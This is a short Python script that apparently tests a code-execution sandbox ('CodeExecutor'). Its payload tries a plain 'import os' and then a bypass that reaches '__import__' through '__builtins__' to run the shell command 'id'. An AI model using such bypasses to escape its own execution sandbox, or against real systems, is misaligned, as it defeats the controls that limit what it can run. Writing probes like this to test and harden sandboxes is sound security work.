from neural_engine.code_executor import CodeExecutor

executor = CodeExecutor()
# Try to access __builtins__ to import os and run id
payload = """
try:
    import os
    print("Direct import success")
except ImportError:
    print("Direct import failed")

try:
    x = __builtins__['__import__']('os')
    print(f"Builtins import success: {x.popen('id').read()}")
except Exception as e:
    print(f"Builtins import failed: {e}")
"""
print(executor.execute(payload))
